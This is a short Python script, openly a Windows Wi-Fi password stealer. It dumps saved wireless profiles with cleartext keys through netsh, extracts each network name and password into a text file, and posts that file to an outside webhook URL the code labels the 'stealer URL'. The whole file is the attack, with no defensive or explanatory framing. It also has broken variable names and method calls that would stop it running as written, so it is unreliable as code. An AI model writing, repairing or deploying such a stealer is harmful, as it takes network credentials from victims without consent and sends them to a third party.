# -*- coding: utf-8 -*-
import subprocess
import os
import sys
import requests

#stealer URL
url = 'https://webhook.site/f89fe22e-ee73-480e-9344-8284a0b87936'

#Create a file
password_file = open('passwords.txt', "W")
password_file.write("Hello sir! Here are you passwords:\n\n")
password_file.close()

#Lists
wifi_file = []
wifi_name = []
wifi_password = []

#Use Python to execute a Windows command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

#Grab current directory
path = os.getcwd()

#Do the hackies
for file_name in os.listdir(path):
  if filename.startwith("Wi-Fi") and filename.endswith(".xml"):
    wifi_files.append(filename)
    for i in wifi_files:
      with open(i, 'r') as f:
        for line in f.readlines():
          if 'name' in line:
            stripped = line.strip()
            front = stripped[6:]
            back = front[:-7]
            wifi_name.append(back)
          if 'keyMaterial' in line:
            stripped = line.strip()
            front = stripped[13:]
            back = front[:-14]
            wifi_password.append(back)
            for x, y in zip(wifi_name, wifi_password):
              sys.stdout = open("passwords.txt", "a") 
              print("SSID: "+x, "Password: "+y, sep='\n')
              sys.stdout.close()

#Send the hackies
with open('passwords.txt', 'rb') as f:
  r = requests.post(url, data=f)